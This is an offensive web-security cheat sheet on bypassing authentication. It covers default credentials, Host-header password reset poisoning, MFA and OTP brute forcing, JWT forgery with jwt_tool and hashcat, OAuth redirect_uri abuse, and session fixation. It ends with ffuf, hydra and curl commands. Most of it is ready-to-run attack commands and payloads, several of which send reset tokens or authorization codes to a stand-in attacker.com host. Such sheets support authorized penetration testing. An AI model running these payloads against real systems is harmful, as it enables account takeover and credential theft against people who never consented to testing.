# Authentication Bypass

## Default Credentials
- Test `admin:admin`, `admin:password`, `root:root`, `test:test`, `guest:guest` on every login form
- Check `/admin`, `/manager`, `/console`, `/dashboard` for default-credential panels
- Query `cirt.net/passwords` and `default-password.info` for vendor-specific defaults
- Tomcat: `tomcat:tomcat`, `admin:s3cret` at `/manager/html`; Jenkins: no auth on `/script`
- Spring Boot Actuator: `GET /actuator/env` — no auth required on misconfigured instances

## Password Reset Poisoning
- Intercept reset request, inject `Host: attacker.com` — reset link points to attacker domain
- Double Host header: `Host: target.com\r\nHost: attacker.com` — back-end may use second
- `X-Forwarded-Host: attacker.com` on reset endpoint — link generated with attacker domain
- Dangling markup via `Host: target.com:'<a href="//attacker.com/?` to exfil token in truncated HTML
- Test `POST /forgot-password` with `Host: attacker.com` and check email source for poisoned URL

## MFA Bypass
- Response manipulation: change `"success":false` to `"success":true` in MFA verify response
- Step skip: after password auth, navigate directly to `/dashboard` — MFA middleware may not gate it
- OTP brute force: `ffuf -u https://target/verify -X POST -d "otp=FUZZ" -w <(seq -w 000000 999999) -mc 200,302 -t 50`
- Race condition: send 50 concurrent OTP verify requests with different codes via Turbo Intruder
- Backup code reuse: verify if backup codes are single-use — replay same code after first use
- SMS/email OTP: request code, intercept response — some APIs return OTP in the response body

## JWT Attacks
- Decode: `jwt_tool <token>` — inspect header, payload, signature
- Algorithm None: `jwt_tool <token> -X a` — sets `alg:none`, strips signature
- HS256/RS256 confusion: `jwt_tool <token> -X k -pk public.pem` — sign with public key as HMAC secret
- kid injection: `jwt_tool <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""` — empty key via path traversal
- JWK injection: `jwt_tool <token> -X i` — embeds attacker JWK in header, self-signs
- jku spoofing: `jwt_tool <token> -X s -ju "https://attacker.com/jwks.json"` — host attacker JWKS
- Crack weak secret: `hashcat -m 16500 jwt.txt rockyou.txt` — mode 16500 for JWT HS256
- Null signature: remove signature portion, keep trailing dot: `eyJhbG...eyJzdW...`
- Expired token replay: modify `exp` claim to future date, re-sign with cracked or None alg
- Change `sub` claim to `admin` or target user ID after compromising signature validation

## OAuth / OIDC
- Open redirect via `redirect_uri=https://attacker.com` — steal authorization code
- Partial path match bypass: `redirect_uri=https://legit.com.attacker.com` or `redirect_uri=https://legit.com%40attacker.com`
- Missing `state` parameter: craft CSRF login link with attacker's OAuth code to link victim account
- Token leakage: `response_type=token` puts access_token in URL fragment — leaks via Referer header
- Scope escalation: request `scope=admin` when only `scope=read` was authorized
- OIDC ID token substitution: swap `id_token` from one client for another — audience not validated
- Authorization code replay: reuse same code if server doesn't invalidate after first exchange

## Session Attacks
- Fixation: set `SESSIONID=attacker_known_value` before victim logs in — attacker shares session
- Cookie scope: check `Domain=.target.com` — any subdomain can read/set the session cookie
- Missing Secure flag: session cookie sent over HTTP — intercept on shared network
- Missing HttpOnly: `document.cookie` exfiltrates session via XSS
- Predictable session: collect 100+ session IDs, analyze with Burp Sequencer for low entropy
- Concurrent session: login on device A, login on device B — verify device A session is NOT invalidated
- Logout bypass: after logout, replay old session cookie — server may not invalidate server-side

## Verification Commands
```bash
# Enumerate login endpoints
ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200,301,302,401,403
# Test default creds with Hydra
hydra -L users.txt -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# Extract JWT from Burp proxy history
grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' proxy.log
# Validate OAuth redirect_uri leniency
curl -v "https://target/oauth/authorize?client_id=X&redirect_uri=https://attacker.com&response_type=code"
```
